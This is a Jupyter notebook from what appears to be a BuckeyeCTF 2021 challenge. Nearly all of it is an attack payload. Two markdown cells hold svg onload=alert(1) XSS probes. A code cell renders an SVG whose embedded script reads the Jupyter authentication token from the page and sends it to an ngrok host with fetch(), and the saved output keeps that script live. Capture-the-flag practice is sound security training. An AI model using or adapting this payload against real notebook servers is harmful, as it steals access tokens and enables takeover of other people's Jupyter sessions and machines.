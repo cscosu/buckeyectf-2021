{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "21dcfcc6",
   "metadata": {},
   "source": [
    "<svg onload=alert(1)>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2fc8bd83",
   "metadata": {},
   "source": [
    "Hello people\n",
    "<svg onload=alert(1)>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "213e33be",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" baseProfile=\"full\">\n",
       "   <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\"/>\n",
       "   <script type=\"text/javascript\">\n",
       "      const x = document.getElementById(&quot;ipython_notebook&quot;);\n",
       "      const token = x.children[0].href.slice(-48);\n",
       "      console.log(token);\n",
       "      fetch(`http://ed85166c285f.ngrok.io/${token}`);\n",
       "   </script>\n",
       "</svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from IPython.display import SVG, display\n",
    "s = \"\"\"<?xml version=\"1.0\" standalone=\"no\"?>\n",
    "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n",
    "\n",
    "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n",
    "   <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\n",
    "   <script type=\"text/javascript\">\n",
    "      const x = document.getElementById(\"ipython_notebook\");\n",
    "      const token = x.children[0].href.slice(-48);\n",
    "      console.log(token);\n",
    "      fetch(`http://ed85166c285f.ngrok.io/${token}`);\n",
    "   </script>\n",
    "</svg>\n",
    "\"\"\"\n",
    "display(SVG(data=s))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98144f2c",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
